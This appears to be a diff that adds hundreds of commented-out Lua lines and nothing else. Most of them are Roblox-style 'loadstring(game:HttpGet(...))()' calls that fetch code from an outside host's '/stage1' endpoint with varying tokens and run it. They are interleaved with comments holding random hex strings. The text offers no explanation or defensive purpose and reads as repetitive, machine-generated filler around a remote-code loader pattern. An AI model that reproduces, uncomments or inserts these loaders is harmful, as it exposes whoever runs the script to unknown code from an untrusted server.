+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_950d0fb2d593ef5d", true))()
+--[[ _f910f9b353db4ac3ea455e8945491b84 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_421b16a491ab5282", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_76079f29737e6774", true))()
+--[[ _5ed4d2335102d4b3f483d341603ae9d3 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e8b7ef3df90f805c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_665d1d91d617164a", true))()
+--[[ _b4d3dedc22b00e68211222779e6b5876 ]]
+--[[ _e829163b1edba5094da733e0ef75a698 ]]
+--[[ _18c1ccf3f47da76bb07fc4f4ef9dcd39 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_81379b1c4b51e6c9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e88bcc9a7aea004d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_45888c7c6d0afefc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_73a8073758325f84", true))()
+--[[ _7071be8be31fb310bf1854c8870f268c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e81be4a161e308b7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3985287bd56172d1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8a70ae723c96d76d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_297b44fe7097d150", true))()
+--[[ _0e0b5c71c4e5418a5cf947326b268267 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_17f60cf4ad5f9af2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_da5b6a198689eb28", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_32265d44f67fb8c9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6573a0b8af30d244", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c84d73f085495323", true))()
+--[[ _336678fc8d9b8e1c0b93edab961e7d44 ]]
+--[[ _422a0d9ac6f92352488c15bbf5dd161c ]]
+--[[ _7515cb620b649a08561f04c76e7bc7d4 ]]
+--[[ _2489b948f2c01ceaac99adba2adff5a9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_91269e9daa5104ba", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c98d9a5599c666d9", true))()
+--[[ _e06583ebb9b05aedd4bb5a6d48f5947a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8b65329ebf906af1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_da72be9e9dbd9a9a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3371ce1f63e08a41", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ac80ea4468daeda4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e04bad06c31956bb", true))()
+--[[ _f86622f4d98f92872a678cebb8e069ad ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d6f4901f30f04473", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e23464552583cdef", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4835b4b94c21f980", true))()
+--[[ _035f3c3a8b7c4e42eb206726a1a941f4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_58239ffbc0651f6e", true))()
+--[[ _49bb342e1fe9b51ae316460196176227 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9f11cbad7ab7cb80", true))()
+--[[ _a1e900e806b7ebfd9595dc464e50a5b2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c031e90b57dc7e4f", true))()
+--[[ _50fa29856852eff19c5b6f10e027e5ee ]]
+--[[ _f8a2dd2d8d7ed09481171666f876300a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_19e1d93e4a94011a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5b20b850598c33ca", true))()
+--[[ _2699097bf621c519c3bba8ec1cd6ce3b ]]
+--[[ _1f1e2bd7338616d1d7b121b8ea25646c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8c6b0129eca58b25", true))()
+--[[ _a5854acad152c95cfdd30f6a6206ed59 ]]
+--[[ _1a11b2fc58026074f890a8c1f5ac4f69 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b697b4ee43f88acf", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6344afc382901efd", true))()
+--[[ _925be173d9f292a343563576e5bdc9a2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5d64d6aa3b491881", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2dfe9bfd02c195e2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9af583affc1a7e01", true))()
+--[[ _59d8ed067e78a73ae7390e7b7e3a2feb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ef8386021068a773", true))()
+--[[ _42aa8f3afe4ff60656aa132792448983 ]]
+--[[ _2e7af6dd5381cf70afbd17c16d57e533 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_da0bff74aaea25c9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2de4f13c0f4d6e5d", true))()
+--[[ _975875e61097f391a6f7a28b4976968b ]]
+--[[ _e68a761d195c895d746e63a507cf6b8d ]]
+--[[ _e23641fd1a7f7d1bff11690b3419938b ]]
+--[[ _62082f6be970d1bd5c19f9a1cd32f2d5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_545f0c17d3c3d229", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2620f99d2afe6b82", true))()
+--[[ _797ec76b52051f9b7c28452f5229e882 ]]
+--[[ _1720445e09ab65260b7bcc64ed2b36c1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a2e86b1bcc76ad55", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7c1135a1d33bfc67", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_15208e7291b79ec5", true))()
+--[[ _f847cf5b7bfe1936dac40968cc21a2ae ]]
+--[[ _903340419d6ba6550adc3d917bb46cd9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bffac5846ae55aa4", true))()
+--[[ _67d46ac15fc9ac47a9507aa588189364 ]]
+--[[ _48f01cd888fe81358e7634b7a42d1f9d ]]
+--[[ _8c6e71dd46e6c6426af038922532c78a ]]
+--[[ _8fc1e8347897650565a6546c86f4253e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a7f9627206e5a8e7", true))()
+--[[ _3cb04c34b98b1e07b3fb482d9b8c8d8f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2b0b61445fe71cad", true))()
+--[[ _3cdb7d6ff1b755380d2e0f42b8ed6cbf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d70c0b01717681a0", true))()
+--[[ _aee7378e54ea77f72b62677bfa081bac ]]
+--[[ _01a7fcff7ed3d671b66e396c2bbaba25 ]]
+--[[ _fb7c04ca41c626a1e5fe17b146029269 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cee13f5243dbc020", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9e9f61e10e8f58ba", true))()
+--[[ _8e02874d853ab0250ce6d781834c8cef ]]
+--[[ _136abb1dcd9660cce617135d4ad9b1b3 ]]
+--[[ _f2d0e7c202e8048325b8a375f28b8b6c ]]
+--[[ _54d9d7ebc49290cf1698f4be252ba0fb ]]
+--[[ _74e69e444c91a5607f8f3bdfff8098b5 ]]
+--[[ _6c352fd15e9969151b2cc4707951a360 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_56818b04f2f2382f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ff1b4bb8c8ca1297", true))()
+--[[ _c7b0aeb434f60bbd08c9e484ddbde4dd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7e0c8560e7479345", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6cc4607548dcec5e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_59c8d88983124110", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3ed3182467b28dff", true))()
+--[[ _fc9c27ca9a13c8a1ccceefcb71faf62a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9dac6f13ab57fe83", true))()
+--[[ _e4184b25edd856f089800be3ce8834d1 ]]
+--[[ _b3c09bf40bf9dbff2f7737b3f1dc31be ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9ca4ca7c89a7a64a", true))()
+--[[ _f813e1f5b2a59801bce7a7190b2bb03d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_705ec30f030d5f5d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1cc3f484601eb341", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_693518f2819c528f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_75f320dfcdcb46fe", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_01497aacdd034a0a", true))()
+--[[ _74548b7159d4cea81219ab95498d2f95 ]]
+--[[ _2090d41e7e1c294d69825b125a649f2f ]]
+--[[ _d25efde10a4050af81098428b60cec74 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_460a65b8b652a9d6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cd2b06d08aec3ed7", true))()
+--[[ _10e8316acffbc71a24c39f0b77c00257 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b19d218fe49d66ce", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_90cf579fc7d90079", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_47ac1e01c9fa645c", true))()
+--[[ _7803052d7b1922d534c072b99c170341 ]]
+--[[ _10e4a86945522efbbf9db5a0fb1e3aaa ]]
+--[[ _92b32213e39cb823bb6db2a0303493d7 ]]
+--[[ _15748ee7db4629615e9500d704b87a23 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ce09ef6a7598eb13", true))()
+--[[ _353099d67f98519c550762664005deab ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3cac2858dc0739c8", true))()
+--[[ _8d3838a9f58708b7f38aecc6d24ad0b6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_09c5440f3cb2815c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6bf87b9b7c6c592c", true))()
+--[[ _e27f295e8011ec6d808e97a09e6d1729 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d221ed53c8c13703", true))()
+--[[ _e4ae5cc972b46aae10e421f847bf3296 ]]
+--[[ _61477b101e4fc35627ef3a2d4579d359 ]]
+--[[ _49b637af19c64d61940e5ce64b857fdb ]]
+--[[ _60b36180b0f124c7367ea3e417d2d53d ]]
+--[[ _f3d40f1816b0106c1be58e79ded5034b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9eafd7f3dab369cb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2207d5e0f68378e8", true))()
+--[[ _27809f1e5dcf94ec6e8290b6cbbc3fd8 ]]
+--[[ _b45284aea0544fbc93b93514d122d1f4 ]]
+--[[ _d6e8e2e22072c4714cedd66979277e6e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_55baa80403368839", true))()
+--[[ _c3c4cdf05465a69c0d203718030e3757 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cf63807d02606f68", true))()
+--[[ _c90743feb382d7e6c6fe337e3b4d2865 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_319e1a4978fa6770", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b2ef6746d5b05549", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_64972f7bc375a667", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fe3255bf35e25cb8", true))()
+--[[ _53ae3113a0fbc841d1c74eab95306e01 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6a5e09d16886586c", true))()
+--[[ _85cbd5a9c3b6addfc8cd4965c7ebf6b1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d2dbcf3831ecff92", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fe75a199eb78e8bc", true))()
+--[[ _ef1d8feed14018dc24ad5320edea4b77 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c0fd46cad02c0c52", true))()
+--[[ _d8ec3d8e1c690260fca77c1b09aecd9e ]]
+--[[ _1df1b0cc645286eec2dbb32e19d460c2 ]]
+--[[ _61e8aca9d7b0bbd55ffba67e1933cd3f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a7beb9180d436606", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1ec1c5afc2fd55b2", true))()
+--[[ _d1feeb3f7457eb70cccb076450dd6045 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1e6424c8fe782d45", true))()
+--[[ _00feee9f40483e99501d8efdd086a430 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ce1501d9382f1fa6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ab9c8b6796ff996f", true))()
+--[[ _8743a504d596b6c24461cedbb047ee4d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_89b13a7e815d1702", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6d593a19f35b4a1a", true))()
+--[[ _d10dab3ac165b011a19d20a79777794f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_90bc82746015e751", true))()
+--[[ _cc94980c6df2e24c67bbfb309a04e9a5 ]]
+--[[ _c787c32ff617a153e3796d26a8cdadf7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_442b669cd29482e4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5f172c52f649eeb0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f0b4075f16a5a2b0", true))()
+--[[ _4edebd68427457247f51dd1a1443ccfe ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_dbdb79a7fb94b5a2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9891573a640b8c65", true))()
+--[[ _eff63ed925601fbb590a8badf05eaf95 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f51d9517bf5dfd5b", true))()
+--[[ _b2058ddf970a659b77a74286ee50ca2b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0aecd17a15358e68", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b2b8f2895d0b3c56", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_dfcbf5c0993c6bde", true))()
+--[[ _a6cc978127d2ed8e5ba02b56383069b3 ]]
+--[[ _61580b7d3e6ea58c27494b2f0a8185a9 ]]
+--[[ _3cab6dfc4cfe84ef38d4923e4be941ae ]]
+--[[ _5a1b01c49a5ebbcc023b230425cb560b ]]
+--[[ _00d39078edd0d94b692101c7c1864036 ]]
+--[[ _122300844d94b378366fb15ce82f328d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c28d1b44b6f3cec0", true))()
+--[[ _cd22af1ec893ed1de976dede108f06c9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e242e83fb38dca7e", true))()
+--[[ _280c897b124a73e5c1e3c30d7b0b666f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3cc5c82690e3e3d6", true))()
+--[[ _8ae202297ab23e7dfe731676bb042f54 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_64062e04080e1cc7", true))()
+--[[ _46a42b1ca82c869fdd21d09fc382ef69 ]]
+--[[ _9ab7c519ae61c493f9b43f6010173cf7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a36a33a44bbf0323", true))()
+--[[ _bf0876fa114c18e642ef110102eb194f ]]
+--[[ _e72927da127412e94bba83a4a9a0a061 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f69eec3b41539ca7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9fb71680e1990b67", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2ac1bc37cbc7b3b4", true))()
+--[[ _3e422ff2a09f20fe2d43680d579ac917 ]]
+--[[ _79c0102c00fa3cec913e68593282a795 ]]
+--[[ _dd4cc1697b6d584c3d0a795a513f2067 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2694a2ca48c91aba", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c9b82878bdfafa12", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_762b1c365680d1d0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c49139d9c98ba006", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_76ec9669f32a4351", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3f951ddd9be221e8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_840893b9048cc949", true))()
+--[[ _ca2f743e45644e10bc01909c7f0859fd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fc8cb2a4c399f97d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_eaea9f19aae62677", true))()
+--[[ _19006e68946c32c77a33337f4d5d5f83 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2cb2abe3dbab7034", true))()
+--[[ _4c67bd6cbc649441b1d0fa71c57ec0b2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_14babd326d73233d", true))()
+--[[ _ba0186835e297651b36d415552dc1fed ]]
+--[[ _7b2bd24d3f6b2373d934c06f242adea6 ]]
+--[[ _71941b277518394f32049d8832daa42d ]]
+--[[ _95492986bc5c868150dab2d0dd38431b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e90f268034ce7354", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1b36ae80d5971f44", true))()
+--[[ _6d581e6f6384785fabb32eeafdd0a2f1 ]]
+--[[ _2edd12abb099410f956ab977a3b5675a ]]
+--[[ _f6b915e3cd4077accf81f6dc38d5aa69 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bb1e921c2d3b5a2d", true))()
+--[[ _17fcbfbd6e9a36ea7517502d98046ea9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_26254c77f71ec9c3", true))()
+--[[ _32f07006feacce899181a47637c5bb5f ]]
+--[[ _7a492193ce314762ef32311f77949c92 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0a57430cc39a4978", true))()
+--[[ _03d24133be43e680b8bf0eaca3d87a47 ]]
+--[[ _8edf19ccd40487fbaff324a4d2dbc5f4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b4bbc84fdbd60671", true))()
+--[[ _12767c523b3c000cef110e3b89501a3e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_23728ce9578b8a37", true))()
+--[[ _7fa493ce03e72bf8cec2b9a53f7f9cab ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_841e3fa51a623d2d", true))()
+--[[ _e51000ab49d5c63954b79ba55595186e ]]
+--[[ _b4cede5c29d386a43d29f487caf8bc5f ]]
+--[[ _2fe7a8e489d44ef8154fc50fb13dc977 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2e450f9929f730d0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c9c185690a5d5459", true))()
+--[[ _4cd1e6034c217c2c9fa4a3c427ffea85 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_781660eccdf8996b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_522c9d923228486f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f845c43f26e5d339", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6db3da52c730733b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f8c4eb82f3c6c36d", true))()
+--[[ _82a8880a1667d1fa9c506ca6a812892d ]]
+--[[ _bd25ad9119da2b5f8964df51eb47062e ]]
+--[[ _b59b02a3bfb76afe182184ace05d5f9b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0c08fc2a0af4e740", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_eca4c3fac4bced99", true))()
+--[[ _e89c9121080635e571cd73109ecb7c57 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_659b888816cf6dda", true))()
+--[[ _c2230a4682f7e9a7386fb893e3a1cbe4 ]]
+--[[ _2b6dd8cc7722cd3ca60889122a7c48d1 ]]
+--[[ _b9f4bc2b04ae3bb63cbb2418fa014cb9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b2d027fad9e30241", true))()
+--[[ _baa0322c71db1fd9b039aea01b942b0b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_272b2a2efc8557b8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b0479bc29257a1ab", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1b75f43333718d65", true))()
+--[[ _0b8df70433a8cea5c6165c52917462b3 ]]
+--[[ _216ce201a20fc37753d18de18c1488fa ]]
+--[[ _b0df033bd0c7b1522d37a4a95f3f6e88 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9a866072b7deb066", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_55d19dc1891fb7a9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_002faa326debfece", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_152a75808f8f25e0", true))()
+--[[ _84bf18692ae1b2ab9d186533e6402ff1 ]]
+--[[ _c55072ebed117d65c88986fe15064293 ]]
+--[[ _1a05501e62e1ebb69b3cb97823018782 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0a7b6390952795a1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f15adec892e202d", true))()
+--[[ _3e24313b037abbeb8095e2aa906f2246 ]]
+--[[ _dddb9ff3efb9b0643c3d0b0707e56270 ]]
+--[[ _1ab266e6d3504578a9d311c3c96b846a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d89a4219defac417", true))()
+--[[ _4d5884d1ebf91ee25602e878db403ec9 ]]
+--[[ _ac645b49455da8cd44b5dac9b71ac7af ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_031e38eea82420ad", true))()
+--[[ _7e411fa3736667854fdd4f6fdfa6e40d ]]
+--[[ _76ab97eb41b90dd1586ae2281becccc3 ]]
+--[[ _445a0b1be41577d82d7a584e8721c4a5 ]]
+--[[ _a25dd569c22768027d164c83a01c1c66 ]]
+--[[ _8a30254712d2e490d1441225e63fd314 ]]
+--[[ _f8e8a68d33e33034fd73558f05c53e7d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5282ddadcf030b12", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f90ceb8e268f578d", true))()
+--[[ _9ea9d47dcbf3eeabee28dd702beaf26f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_363a2197fee8837a", true))()
+--[[ _d16fa887631b3822f27047c5755cf185 ]]
+--[[ _bb73e5f671ad66a68c835d6e8cde37ed ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d7aeff78a2467187", true))()
+--[[ _703cd0a0e0f9d86e610e804b69f31d52 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_79ba3bffc68978b0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b2f74751327625e1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8fdf9657d436b014", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b3f18f6cf2af3697", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0ee7f647b6caf9c4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fb63b3b45d28e4ff", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_65b5a8bd171bf71b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9547de00d755656e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_22854158e57b85e8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_213716f2dca24333", true))()
+--[[ _2ff36eb0c4574ac7431f492a92ce27dd ]]
+--[[ _3ff47ce9f9164743d4fdbb1bd2a13843 ]]
+--[[ _7ab0df0571ae1b3bf29672635e316b56 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_871fb8cc18e93d6f", true))()
+--[[ _9fa2386a1a4c86016e63741e8d83f76f ]]
+--[[ _8700f9c97da4e6a921fcf21599635673 ]]
+--[[ _3b628b174adc2765a3233c6b18c2571e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cb2040f65037cfb2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cd121d202545fa69", true))()
+--[[ _b19f9469af1a09172c993d259553d42c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d00fd10c68447209", true))()
+--[[ _23808137ae2bbcf180711e778e66cb76 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e35ace58de5e8288", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9085dfbbe6940fff", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7e4b2194838229e6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2a13dcc17cb8ae04", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0d9347e04e11d8a0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a004949674be90ce", true))()
+--[[ _e614068df16ca94bea36ce5857723c28 ]]
+--[[ _e6f4a9a3eafdc7eb7c5bec14302002b0 ]]
+--[[ _1c182abe11b461e8e0d250b542d5141f ]]
+--[[ _bc4ec1d2cdec505b89b42e19c74fcb8d ]]
+--[[ _6f211b98b4ec4672abe7daeb4d2cf9b5 ]]
+--[[ _7fc44e1a7e1139ffa75c03ac8c0164e3 ]]
+--[[ _edf8e5cc7df262db9dfcc291236da05a ]]
